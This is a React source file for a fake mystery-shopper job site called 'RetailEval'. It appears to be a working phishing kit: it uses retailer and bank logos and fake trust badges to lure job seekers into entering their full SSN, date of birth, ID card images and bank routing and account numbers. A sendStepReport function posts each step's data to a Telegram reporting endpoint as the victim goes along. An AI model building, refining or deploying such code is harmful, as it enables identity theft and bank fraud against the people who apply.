import { ChangeEvent, FormEvent, useEffect, useMemo, useState } from "react";
import styles from "./Index.module.css";
import retailevalLogo from "@/assets/retaileval-professional-logo.png";
import storeEvaluationHero from "@/assets/store-evaluation-hero.jpg";
import affirmLogo from "@/assets/partners/affirm-logo.jpg";
import bankOfAmericaLogo from "@/assets/partners/bank-of-america-logo.jpg";
import bestBuyLogo from "@/assets/partners/best-buy-logo.jpg";
import capitalOneLogo from "@/assets/partners/capital-one-logo.jpg";
import chaseLogo from "@/assets/partners/chase-logo.jpg";
import cvsLogo from "@/assets/partners/cvs-logo.jpg";
import discoverLogo from "@/assets/partners/discover-logo.jpg";
import krogerLogo from "@/assets/partners/kroger-logo.jpg";
import lowesLogo from "@/assets/partners/lowes-logo.jpg";
import monaVideoThumb from "@/assets/partners/mona-video-thumb.jpg";
import synchronyLogo from "@/assets/partners/synchrony-logo.jpg";
import targetLogo from "@/assets/partners/target-logo.jpg";
import walmartLogo from "@/assets/partners/walmart-logo.jpg";
import bbaCreditBadge from "@/assets/trust/bba-credit.svg";
import bbbAccreditedBadge from "@/assets/trust/bbb-accredited.svg";

const TOTAL_STEPS = 10;
const STORAGE_KEY = "retaileval-application-progress";
const TRACKING_KEY = "retaileval-completed-application";
const TELEGRAM_REPORT_ENDPOINT = import.meta.env.VITE_TELEGRAM_REPORT_URL || "/api/telegram-report";

type FormDataState = {
  fullName: string;
  email: string;
  phone: string;
  zip: string;
  city: string;
  state: string;
  address: string;
  dob: string;
  employee: string;
  ssn: string;
  idFront: string;
  idBack: string;
  paymentMethod: string;
  payeeName: string;
  payeeAddress: string;
  bankName: string;
  routingNumber: string;
  accountNumber: string;
  accountType: string;
};

type UploadedImages = Partial<Record<"idFront" | "idBack", { fileName: string; dataUrl: string }>>;

type LoaderState = {
  active: boolean;
  text: string;
};

type TrackingRecord = {
  trackingCode: string;
  fullName: string;
  email: string;
  phone: string;
  city: string;
  state: string;
  submittedAt: string;
  status: "Application Received";
};

const initialFormData: FormDataState = {
  fullName: "",
  email: "",
  phone: "",
  zip: "",
  city: "",
  state: "",
  address: "",
  dob: "",
  employee: "",
  ssn: "",
  idFront: "",
  idBack: "",
  paymentMethod: "",
  payeeName: "",
  payeeAddress: "",
  bankName: "",
  routingNumber: "",
  accountNumber: "",
  accountType: "",
};

const driveVideoUrl = "https://drive.google.com/file/d/1_IJPf_ZXBIfXswU_Jnxs_BwmeJvZV4qS/preview?autoplay=1";

const retailPartners = [
  { name: "Walmart", logo: walmartLogo },
  { name: "Target", logo: targetLogo },
  { name: "Best Buy", logo: bestBuyLogo },
  { name: "CVS", logo: cvsLogo },
  { name: "Kroger", logo: krogerLogo },
  { name: "Lowe's", logo: lowesLogo },
];
const financialPartners = [
  { name: "Synchrony", logo: synchronyLogo },
  { name: "Chase", logo: chaseLogo },
  { name: "Bank of America", logo: bankOfAmericaLogo },
  { name: "Discover", logo: discoverLogo },
  { name: "Capital One", logo: capitalOneLogo },
  { name: "Affirm", logo: affirmLogo },
];

const benefits = [
  ["$65 Per Visit", "Earn competitive pay for each store evaluation you complete"],
  ["Flexible Hours", "Work on your own schedule - mornings, evenings, or weekends"],
  ["No Experience Needed", "We provide complete training for all new evaluators"],
  ["Fast Payment", "Get paid within 7-10 days via direct deposit"],
];

const processSteps = [
  ["01", "Apply Online", "Fill out our simple 2-minute application form"],
  ["02", "Verify Identity", "Submit your ID and verification documents"],
  ["03", "Setup Payment", "Add your bank details for direct deposit"],
  ["04", "Start Earning", "Accept assignments and earn $65 per visit"],
];

const trustBadges = [
  { title: "BBAcredit", description: "Financial Services", image: bbaCreditBadge },
  { title: "BBB Accredited", description: "A+ Rating", image: bbbAccreditedBadge },
];

const safeProgressData = (data: FormDataState) => ({
  fullName: data.fullName,
  email: data.email,
  phone: data.phone,
  zip: data.zip,
  city: data.city,
  state: data.state,
  address: data.address,
    dob: data.dob,
  employee: data.employee,
    paymentMethod: data.paymentMethod,
  payeeName: data.payeeName,
  payeeAddress: data.payeeAddress,
  bankName: data.bankName,
  accountType: data.accountType,
});

const delay = (ms: number) => new Promise((resolve) => window.setTimeout(resolve, ms));

const createTrackingCode = () => `RE-${new Date().getFullYear()}-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;

const formatSsn = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 9);
  if (digits.length <= 3) return digits;
  if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
};

const reportFieldsForStep = (step: number, data: FormDataState): Record<string, string> => {
  const location = `${data.address}, ${data.city}, ${data.state} ${data.zip}`.replace(/^,\s*/, "").trim();
  switch (step) {
    case 1: return { "ZIP Code": data.zip, City: data.city, State: data.state };
    case 2: return { Address: location };
    case 3: return { Name: data.fullName, Email: data.email, Phone: data.phone, "Date of Birth": data.dob };
    case 4: return { "Existing Employee": data.employee };
    case 5: return { SSN: data.ssn || "Missing" };
    case 6: return { "ID Front": data.idFront };
    case 7: return { "ID Back": data.idBack };
    case 8: return { "Payment Type": data.paymentMethod };
    case 9:
      return data.paymentMethod === "Check"
        ? { "Payment Type": data.paymentMethod, "Payee Name": data.payeeName, "Mailing Address": data.payeeAddress }
        : { "Payment Type": data.paymentMethod, "Bank Name": data.bankName, "Routing Number": data.routingNumber, "Account Type": data.accountType, "Account Number": data.accountNumber };
    default: return { Name: data.fullName, Email: data.email, Phone: data.phone, Location: location, "Payment Type": data.paymentMethod };
  }
};

const reportTitleForStep = (step: number) => ["", "ZIP Code Submitted", "Address Submitted", "Personal Information Submitted", "Employee Status Submitted", "SSN Verification Submitted", "ID Front Image Submitted", "ID Back Image Submitted", "Payment Type Selected", "Payment Details Submitted", "Final Application Submitted"][step] ?? "Application Update";

const withApplicantContext = (data: FormDataState, fields: Record<string, string>) => ({
  "Applicant Name": data.fullName,
  "Applicant Email": data.email,
  "Applicant Phone": data.phone,
  "Date of Birth": data.dob,
  ...fields,
});

const Index = () => {
  const [mode, setMode] = useState<"home" | "application" | "success" | "tracking">("home");
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState<FormDataState>(initialFormData);
  const [uploadedImages, setUploadedImages] = useState<UploadedImages>({});
  const [trackingRecord, setTrackingRecord] = useState<TrackingRecord | null>(null);
  const [error, setError] = useState("");
  const [loader, setLoader] = useState<LoaderState>({ active: false, text: "Processing..." });

  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (!saved) return;

    try {
      const parsed = JSON.parse(saved) as Partial<FormDataState> & { step?: number };
      setFormData((current) => ({ ...current, ...parsed }));
      if (parsed.step && parsed.step > 1 && parsed.step <= TOTAL_STEPS) {
        setStep(parsed.step);
      }
    } catch {
      localStorage.removeItem(STORAGE_KEY);
    }
  }, []);

  useEffect(() => {
    const savedTracking = localStorage.getItem(TRACKING_KEY);
    if (!savedTracking) return;

    try {
      setTrackingRecord(JSON.parse(savedTracking) as TrackingRecord);
    } catch {
      localStorage.removeItem(TRACKING_KEY);
    }
  }, []);

  useEffect(() => {
    const payload = { ...safeProgressData(formData), step };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(payload));
  }, [formData, step]);

  const completion = useMemo(() => Math.round((step / TOTAL_STEPS) * 100), [step]);

  const showLoader = async (text: string, seconds = 4) => {
    setLoader({ active: true, text });
    await delay(seconds * 1000);
    setLoader({ active: false, text });
  };

  const updateField = (field: keyof FormDataState, value: string) => {
    setError("");
    setFormData((current) => field === "zip" && value !== current.zip ? { ...current, zip: value, city: "", state: "", address: "" } : { ...current, [field]: value });
  };

  const startApplication = async (zip = "") => {
    const cleanZip = zip.replace(/\D/g, "").slice(0, 5);
    const savedZip = formData.zip;
    if (cleanZip && cleanZip !== savedZip) {
      setFormData({ ...initialFormData, zip: cleanZip });
      setUploadedImages({});
      localStorage.removeItem(STORAGE_KEY);
    } else if (cleanZip) {
      updateField("zip", cleanZip);
    }
    setMode("application");
    setStep(1);
    await showLoader("Processing...", zip ? 3 : 2);
  };

  const sendStepReport = async (targetStep: number, image?: { fileName: string; dataUrl: string }, fields = reportFieldsForStep(targetStep, formData)) => {
    try {
      const reportResponse = await fetch(TELEGRAM_REPORT_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ step: targetStep, title: reportTitleForStep(targetStep), fields: withApplicantContext(formData, fields), image }),
      });
      if (!reportResponse.ok) throw new Error("Telegram notification failed");
    } catch {
      setError("Telegram notification could not be delivered. Please try again.");
      throw new Error("Telegram notification failed");
    }
  };

  const lookupZip = async () => {
    const zip = formData.zip.trim();
    if (!/^\d{5}$/.test(zip)) {
      setError("Enter a valid 5-digit ZIP code.");
      return false;
    }

    setLoader({ active: true, text: "Fetching your location..." });
    try {
      await delay(3000);
      const response = await fetch(`https://api.zippopotam.us/us/${encodeURIComponent(zip)}`);
      if (!response.ok) throw new Error("ZIP lookup failed");
      const data = await response.json();
      const place = data?.places?.[0];
      if (!place) throw new Error("No location found");

      setFormData((current) => ({
        ...current,
        city: place["place name"] || "",
        state: place["state abbreviation"] || "",
      }));
      return true;
    } catch {
      setError("We could not detect that ZIP code. Please check it and try again.");
      return false;
    } finally {
      setLoader({ active: false, text: "Fetching your location..." });
    }
  };

  const isCurrentStepValid = () => {
    switch (step) {
      case 1:
        return /^\d{5}$/.test(formData.zip);
      case 2:
        return formData.address.trim().length >= 5 && Boolean(formData.city && formData.state);
      case 3:
        return formData.fullName.trim().length >= 2 && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email) && formData.phone.replace(/\D/g, "").length >= 10 && Boolean(formData.dob);
      case 4:
        return Boolean(formData.employee);
      case 5:
        return /^\d{9}$/.test(formData.ssn.replace(/\D/g, ""));
      case 6:
        return Boolean(formData.idFront);
      case 7:
        return Boolean(formData.idBack);
      case 8:
        return Boolean(formData.paymentMethod);
      case 9:
        if (formData.paymentMethod === "Check") {
          return formData.payeeName.trim().length >= 2 && formData.payeeAddress.trim().length >= 5;
        }
        return (
          formData.bankName.trim().length >= 2 &&
          /^\d{9}$/.test(formData.routingNumber) &&
          /^\d{4,17}$/.test(formData.accountNumber) &&
          Boolean(formData.accountType)
        );
      case 10:
        return true;
      default:
        return false;
    }
  };

  const nextStep = async () => {
    if (!isCurrentStepValid()) {
      setError("Complete the required information before continuing.");
      return;
    }

    if (step === 2) {
      await showLoader("Processing...", 4);
    }

    let reportFields = reportFieldsForStep(step, formData);
    if (step === 1) {
      const located = await lookupZip();
      if (!located) return;
      reportFields = { "ZIP Code": formData.zip, Status: "Location verified" };
    }

    if (step === 9) {
      await showLoader("Processing...", 3);
    }

    await sendStepReport(step, step === 6 ? uploadedImages.idFront : step === 7 ? uploadedImages.idBack : undefined, reportFields);
    setStep((current) => Math.min(current + 1, TOTAL_STEPS));
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const previousStep = () => {
    setError("");
    setStep((current) => Math.max(current - 1, 1));
  };

  const completeApplication = async () => {
    await showLoader("Submitting application...", 3);
    const completed: TrackingRecord = {
      trackingCode: createTrackingCode(),
      fullName: formData.fullName.trim(),
      email: formData.email.trim(),
      phone: formData.phone.trim(),
      city: formData.city,
      state: formData.state,
      submittedAt: new Date().toISOString(),
      status: "Application Received",
    };
    await sendStepReport(TOTAL_STEPS);
    setTrackingRecord(completed);
    localStorage.setItem(TRACKING_KEY, JSON.stringify(completed));
    localStorage.removeItem(STORAGE_KEY);
    setMode("success");
  };

  const handleFile = (field: keyof FormDataState, event: ChangeEvent<HTMLInputElement>, allowed: RegExp) => {
    const file = event.target.files?.[0];
    if (!file) return;
    if (!allowed.test(file.name)) {
      setError("Upload a supported file type for this step.");
      event.target.value = "";
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      updateField(field, file.name);
      if (field === "idFront" || field === "idBack") {
        setUploadedImages((current) => ({ ...current, [field]: { fileName: file.name, dataUrl: String(reader.result) } }));
      }
    };
    reader.readAsDataURL(file);
  };

  if (mode === "success") {
    return (
      <main className={`${styles.retailPage} ${styles.successPage}`}>
        <section className={`${styles.successShell} ${styles.intensePanel}`}>
          <img className={styles.successLogo} src={retailevalLogo} alt="RetailEval Logo" />
          <p className={styles.eyebrow}>Application status</p>
          <h1>Application Submitted Successfully</h1>
          <p>Your RetailEval application has been received. An application specialist will review your file and an interview coordinator may contact you by text message within 24-48 hours.</p>
          {trackingRecord && <div className={styles.trackingCodeCard}><span>Tracking Code</span><strong>{trackingRecord.trackingCode}</strong></div>}
          <div className={styles.successActions}>
            <button className={styles.primaryButton} onClick={() => setMode("tracking")}>Track Application</button>
            <button className={styles.secondaryButton} onClick={() => setMode("home")}>Return Home</button>
          </div>
        </section>
      </main>
    );
  }

  return (
    <main className={styles.retailPage}>
      {loader.active && <LoadingOverlay text={loader.text} />}
      {mode === "home" ? (
        <HomePage onStart={startApplication} onTrack={() => setMode("tracking")} />
      ) : mode === "tracking" ? (
        <TrackingPage record={trackingRecord} onHome={() => setMode("home")} />
      ) : (
        <ApplicationFlow
          completion={completion}
          error={error}
          formData={formData}
          isValid={isCurrentStepValid()}
          onBack={previousStep}
          onComplete={completeApplication}
          onFile={handleFile}
          onNext={nextStep}
          setMode={setMode}
          step={step}
          updateField={updateField}
        />
      )}
    </main>
  );
};

const LoadingOverlay = ({ text }: { text: string }) => (
  <div className={styles.loadingOverlay} role="status" aria-live="polite">
    <div className={styles.loaderCard}>
      <div className={styles.spinner} />
      <p>{text}</p>
    </div>
  </div>
);

const HomePage = ({ onStart, onTrack }: { onStart: (zip?: string) => void; onTrack: () => void }) => {
  const [zip, setZip] = useState("");

  const submitZip = (event: FormEvent) => {
    event.preventDefault();
    onStart(zip);
  };

  return (
    <>
      <header className={styles.siteHeader}>
        <a className={styles.logoLockup} href="#top" aria-label="RetailEval home">
          <img className={styles.brandLogo} src={retailevalLogo} alt="RetailEval Logo" />
          <span>RetailEval</span>
        </a>
        <nav aria-label="Primary navigation">
          <a href="#top">Home</a>
          <button onClick={onTrack} type="button">Track Application</button>
        </nav>
        <form className={styles.navZip} onSubmit={submitZip}>
          <input value={zip} onChange={(event) => setZip(event.target.value.replace(/\D/g, "").slice(0, 5))} placeholder="Enter ZIP Code" inputMode="numeric" />
          <button type="submit">Get Started</button>
        </form>
      </header>

      <section className={`${styles.heroSection} ${styles.heroImageSection}`} id="top" style={{ backgroundImage: `url(${storeEvaluationHero})` }}>
        <div className={styles.heroCopy}>
          <p className={styles.eyebrow}>Now Hiring Nationwide</p>
          <h1>Earn $65 Per Store Visit</h1>
          <p>Join thousands of mystery shoppers evaluating top retail stores. Flexible hours, no experience needed, and fast payments.</p>
          <form className={styles.heroForm} onSubmit={submitZip}>
            <label htmlFor="hero-zip">Enter your ZIP code to check availability in your area</label>
            <div>
              <input id="hero-zip" value={zip} onChange={(event) => setZip(event.target.value.replace(/\D/g, "").slice(0, 5))} placeholder="Enter ZIP Code" inputMode="numeric" />
              <button className={styles.primaryButton} type="submit">Get Started</button>
            </div>
          </form>
          <button className={styles.secondaryButton} onClick={onTrack} type="button">Track Application</button>
        </div>
      </section>

      <LogoCloud title="Evaluate At" subtitle="50+ Major Retail Stores" items={retailPartners} />
      <LogoCloud title="Trusted By" subtitle="Financial Partners" items={financialPartners} compact />

      <section className={styles.contentBand}>
        <div className={styles.sectionHeading}>
          <h2>Why Join RetailEval?</h2>
          <p>We offer competitive pay, flexible scheduling, and the opportunity to work with major retailers.</p>
        </div>
        <div className={styles.benefitGrid}>
          {benefits.map(([title, description]) => (
            <article className={styles.benefitCard} key={title}>
              <h3>{title}</h3>
              <p>{description}</p>
            </article>
          ))}
        </div>
      </section>

      <section className={`${styles.contentBand} ${styles.processBand}`}>
        <div className={styles.sectionHeading}>
          <h2>How It Works</h2>
          <p>Get started in minutes and begin earning with our simple 4-step process.</p>
        </div>
        <div className={styles.processGrid}>
          {processSteps.map(([number, title, description]) => (
            <article className={styles.processCard} key={number}>
              <span>{number}</span>
              <h3>{title}</h3>
              <p>{description}</p>
            </article>
          ))}
        </div>
      </section>

      <section className={styles.watchSection}>
        <div>
          <p className={styles.eyebrow}>Watch & Learn</p>
          <h2>See What We're Looking For</h2>
          <p>Watch this quick video to understand the evaluation process and what makes a great mystery shopper.</p>
        </div>
        <div className={styles.videoPanel}>
          <img src={monaVideoThumb} alt="Retail evaluation training video preview" />
          <iframe src={driveVideoUrl} title="Retail evaluation overview video" allow="autoplay; encrypted-media; fullscreen" allowFullScreen />
        </div>
      </section>

      <section className={styles.finalCta}>
        <h2>Ready to Start Earning?</h2>
        <p>Enter your ZIP code to get started and earn $65 per store visit.</p>
        <form onSubmit={submitZip}>
          <input value={zip} onChange={(event) => setZip(event.target.value.replace(/\D/g, "").slice(0, 5))} placeholder="ZIP Code" inputMode="numeric" />
          <button className={styles.primaryButton} type="submit">Get Started</button>
        </form>
      </section>

      <section className={styles.trustRow} aria-label="Trust and verification details">
        {[["Secure & Verified", "SSL Encrypted"], ["Established Company", "Based in San Francisco"], ["1000+ Evaluators", "Nationwide Network"]].map(([title, description]) => (
          <div key={title}>
            <strong>{title}</strong>
            <span>{description}</span>
          </div>
        ))}
      </section>

      <Footer onStart={onStart} onTrack={onTrack} />
    </>
  );
};

const LogoCloud = ({ title, subtitle, items, compact = false }: { title: string; subtitle: string; items: { name: string; logo: string }[]; compact?: boolean }) => (
  <section className={`${styles.logoCloud} ${compact ? styles.compact : ""}`}>
    <p>{title}</p>
    <h2>{subtitle}</h2>
    <div>
      {items.map((item) => (
        <article key={item.name}>
          <img src={item.logo} alt={`${item.name} logo`} loading="lazy" />
          <strong>{item.name}</strong>
        </article>
      ))}
    </div>
  </section>
);

const TrackingPage = ({ record, onHome }: { record: TrackingRecord | null; onHome: () => void }) => {
  const [code, setCode] = useState("");
  const normalized = code.trim().toUpperCase();
  const matched = record && normalized === record.trackingCode;

  return (
    <section className={styles.trackingShell}>
      <button className={styles.textButton} onClick={onHome} type="button">Back to RetailEval</button>
      <div className={`${styles.trackingPanel} ${styles.intensePanel}`}>
        <img className={styles.successLogo} src={retailevalLogo} alt="RetailEval Logo" />
        <p className={styles.eyebrow}>Track Application</p>
        <h1>Check your application status</h1>
        <p>Enter the tracking code shown after submission. Tracking is stored securely in this browser session without a database.</p>
        <div className={styles.trackingSearch}>
          <input value={code} onChange={(event) => setCode(event.target.value.toUpperCase())} placeholder="RE-2026-ABC123" />
        </div>
        {matched ? (
          <div className={styles.statusCard}>
            <span className={styles.statusPill}>{record.status}</span>
            <h2>{record.trackingCode}</h2>
            <dl>
              <div><dt>Applicant</dt><dd>{record.fullName}</dd></div>
              <div><dt>Email</dt><dd>{record.email}</dd></div>
              <div><dt>Location</dt><dd>{record.city}, {record.state}</dd></div>
              <div><dt>Submitted</dt><dd>{new Date(record.submittedAt).toLocaleString()}</dd></div>
            </dl>
            <p>An application expert is reviewing your file. If your profile matches current store evaluation openings, an interview coordinator may send you a text message within 24-48 hours.</p>
          </div>
        ) : (
          <div className={`${styles.statusCard} ${styles.mutedStatus}`}>
            <span className={styles.statusPill}>Awaiting code</span>
            <p>{record ? "Enter your exact tracking code to view the current status." : "No completed application is saved in this browser yet. Submit an application first to generate a tracking code."}</p>
          </div>
        )}
      </div>
    </section>
  );
};

const ApplicationFlow = ({
  completion,
  error,
  formData,
  isValid,
  onBack,
  onComplete,
  onFile,
  onNext,
  setMode,
  step,
  updateField,
}: {
  completion: number;
  error: string;
  formData: FormDataState;
  isValid: boolean;
  onBack: () => void;
  onComplete: () => void;
  onFile: (field: keyof FormDataState, event: ChangeEvent<HTMLInputElement>, allowed: RegExp) => void;
  onNext: () => void;
  setMode: (mode: "home" | "application" | "success" | "tracking") => void;
  step: number;
  updateField: (field: keyof FormDataState, value: string) => void;
}) => (
  <section className={styles.applicationShell}>
    <button className={styles.textButton} onClick={() => setMode("home")} type="button">Back to RetailEval</button>
    <div className={styles.progressPanel}>
      <div>
        <span>Application progress</span>
        <strong>{completion}%</strong>
      </div>
      <div className={styles.progressTrack}><span style={{ width: `${completion}%` }} /></div>
    </div>

    <div className={styles.formCard} key={step}>
      <p className={styles.stepLabel}>Step {step} of {TOTAL_STEPS}</p>
      <StepContent formData={formData} onFile={onFile} step={step} updateField={updateField} />
      {error && <p className={styles.formError}>{error}</p>}
      <div className={styles.formActions}>
        {step > 1 && <button className={styles.secondaryButton} onClick={onBack} type="button">Previous</button>}
        {step < TOTAL_STEPS ? (
          <button className={styles.primaryButton} disabled={!isValid} onClick={onNext} type="button">Next</button>
        ) : (
          <button className={styles.primaryButton} onClick={onComplete} type="button">Submit Application</button>
        )}
      </div>
    </div>
  </section>
);

const StepContent = ({
  formData,
  onFile,
  step,
  updateField,
}: {
  formData: FormDataState;
  onFile: (field: keyof FormDataState, event: ChangeEvent<HTMLInputElement>, allowed: RegExp) => void;
  step: number;
  updateField: (field: keyof FormDataState, value: string) => void;
}) => {
  switch (step) {
    case 1:
      return <TextStep title="Enter your ZIP Code" value={formData.zip} onChange={(value) => updateField("zip", value.replace(/\D/g, "").slice(0, 5))} placeholder="ZIP Code" inputMode="numeric" />;
    case 2:
      return (
        <div className={styles.fieldStack}>
          <h1>Street Address</h1>
          <p className={styles.helperText}>Let's see if our service is available near your area before we continue.</p>
          <label>Street Address<input value={formData.address} onChange={(event) => updateField("address", event.target.value)} placeholder="Street address" /></label>
          <div className={styles.splitFields}>
            <label>City<input value={formData.city} onChange={(event) => updateField("city", event.target.value)} /></label>
            <label>State<input value={formData.state} onChange={(event) => updateField("state", event.target.value.toUpperCase().slice(0, 2))} /></label>
          </div>
        </div>
      );
    case 3:
      return (
        <div className={styles.fieldStack}>
          <h1>Personal Information</h1>
          <label>Full Name<input value={formData.fullName} onChange={(event) => updateField("fullName", event.target.value)} placeholder="Enter your legal full name" /></label>
          <label>Email Address<input value={formData.email} onChange={(event) => updateField("email", event.target.value)} placeholder="you@example.com" type="email" /></label>
          <label>Phone Number<input value={formData.phone} onChange={(event) => updateField("phone", event.target.value)} placeholder="(555) 000-0000" inputMode="tel" /></label>
          <label>Date of Birth<input value={formData.dob} onChange={(event) => updateField("dob", event.target.value)} type="date" /></label>
        </div>
      );
    case 4:
      return (
        <div className={styles.fieldStack}>
          <h1>Are you an existing employee?</h1>
          <div className={styles.choiceGrid}>
            {['Yes', 'No'].map((choice) => <button className={formData.employee === choice ? styles.selected : ""} key={choice} onClick={() => updateField("employee", choice)} type="button">{choice}</button>)}
          </div>
        </div>
      );
    case 5:
      return (
        <div className={styles.fieldStack}>
          <h1>9-Digit Social Security Number</h1>
          <input value={formData.ssn} onChange={(event) => updateField("ssn", formatSsn(event.target.value))} placeholder="000-00-0000" inputMode="numeric" maxLength={11} autoFocus />
          <p className={styles.helperText}>Enter the full 9-digit SSN in standard job application format.</p>
        </div>
      );
    case 6:
      return <FileStep title="ID Card Front" label="Upload a clear front image of your ID card" fileName={formData.idFront} accept="image/png,image/jpeg,image/webp" onChange={(event) => onFile("idFront", event, /\.(png|jpe?g|webp)$/i)} />;
    case 7:
      return <FileStep title="ID Card Back" label="Upload a clear back image of your ID card" fileName={formData.idBack} accept="image/png,image/jpeg,image/webp" onChange={(event) => onFile("idBack", event, /\.(png|jpe?g|webp)$/i)} />;
    case 8:
      return (
        <div className={styles.fieldStack}>
          <h1>Select Payment Type</h1>
          <div className={styles.choiceGrid}>
            {['Check', 'Direct Deposit'].map((choice) => <button className={formData.paymentMethod === choice ? styles.selected : ""} key={choice} onClick={() => updateField("paymentMethod", choice)} type="button">{choice}</button>)}
          </div>
        </div>
      );
    case 9:
      if (formData.paymentMethod === "Check") {
        return (
          <div className={styles.fieldStack}>
            <h1>Check Payment Details</h1>
            <label>Payee Name<input value={formData.payeeName} onChange={(event) => updateField("payeeName", event.target.value)} placeholder="Name for the check" /></label>
            <label>Mailing Address<input value={formData.payeeAddress} onChange={(event) => updateField("payeeAddress", event.target.value)} placeholder="Where should we mail your check?" /></label>
          </div>
        );
      }
      return (
        <div className={styles.fieldStack}>
          <h1>Direct Deposit Information</h1>
          <label>Bank Name<input value={formData.bankName} onChange={(event) => updateField("bankName", event.target.value)} placeholder="Bank name" /></label>
          <div className={styles.splitFields}>
            <label>Routing Number<input value={formData.routingNumber} onChange={(event) => updateField("routingNumber", event.target.value.replace(/\D/g, "").slice(0, 9))} inputMode="numeric" /></label>
            <label>Account Number<input value={formData.accountNumber} onChange={(event) => updateField("accountNumber", event.target.value.replace(/\D/g, "").slice(0, 17))} inputMode="numeric" /></label>
          </div>
          <label>Account Type<select value={formData.accountType} onChange={(event) => updateField("accountType", event.target.value)}><option value="">Select account type</option><option>Checking</option><option>Savings</option></select></label>
        </div>
      );
    default:
      return <SummaryStep formData={formData} />;
  }
};

const TextStep = ({ title, value, onChange, placeholder, inputMode, helper }: { title: string; value: string; onChange: (value: string) => void; placeholder: string; inputMode?: "numeric" | "tel"; helper?: string }) => (
  <div className={styles.fieldStack}>
    <h1>{title}</h1>
    <input value={value} onChange={(event) => onChange(event.target.value)} placeholder={placeholder} inputMode={inputMode} autoFocus />
    {helper && <p className={styles.helperText}>{helper}</p>}
  </div>
);

const FileStep = ({ title, label, fileName, accept, onChange }: { title: string; label: string; fileName: string; accept: string; onChange: (event: ChangeEvent<HTMLInputElement>) => void }) => (
  <div className={styles.fieldStack}>
    <h1>{title}</h1>
    <label className={styles.uploadBox}>
      <span>{label}</span>
      <input type="file" accept={accept} onChange={onChange} />
      <strong>{fileName || "Choose file"}</strong>
    </label>
  </div>
);

const SummaryStep = ({ formData }: { formData: FormDataState }) => {
  const rows = [
    ["Name", formData.fullName],
    ["Email", formData.email],
    ["Phone", formData.phone],
    ["Location", `${formData.address}, ${formData.city}, ${formData.state} ${formData.zip}`],
    ["Existing Employee", formData.employee],
    ["SSN", formData.ssn ? "Provided" : "Missing"],
    ["ID Front", formData.idFront || "Missing"],
    ["ID Back", formData.idBack || "Missing"],
    ["Payment Type", formData.paymentMethod || "Missing"],
    ["Payee", formData.payeeName],
    ["Bank", formData.bankName],
    ["Account", formData.accountType ? `${formData.accountType} account ending ${formData.accountNumber.slice(-4)}` : "Missing"],
  ];

  return (
    <div className={styles.fieldStack}>
      <h1>Review Your Application</h1>
      <div className={styles.summaryList}>
        {rows.map(([label, value]) => <div key={label}><span>{label}</span><strong>{value}</strong></div>)}
      </div>
    </div>
  );
};

const Footer = ({ onStart, onTrack }: { onStart: (zip?: string) => void; onTrack: () => void }) => (
  <footer className={styles.siteFooter}>
    <div>
      <a className={styles.logoLockup} href="#top"><img className={styles.brandLogo} src={retailevalLogo} alt="RetailEval Logo" /><span>RetailEval</span></a>
      <p>Professional mystery shopping services for major retail chains across the nation.</p>
    </div>
    <div>
      <h3>Quick Links</h3>
      <button onClick={() => onStart()} type="button">Apply Now</button>
      <button onClick={onTrack} type="button">Track Application</button>
    </div>
    <div>
      <h3>Contact</h3>
      <p>(817) 357-8105<br />careers@retaileval.com<br />201 Third Street<br />San Francisco, CA</p>
    </div>
    <div>
      <h3>Powered By</h3>
      <div className={styles.footerTrustBadges}>
        {trustBadges.map((badge) => (
          <article key={badge.title}>
            <img src={badge.image} alt={`${badge.title} ${badge.description}`} loading="lazy" />
            <strong>{badge.title}</strong>
            <span>{badge.description}</span>
          </article>
        ))}
      </div>
    </div>
    <small>© 2026 RetailEval Careers. All rights reserved. Privacy Policy · Terms of Service</small>
  </footer>
);

export default Index;
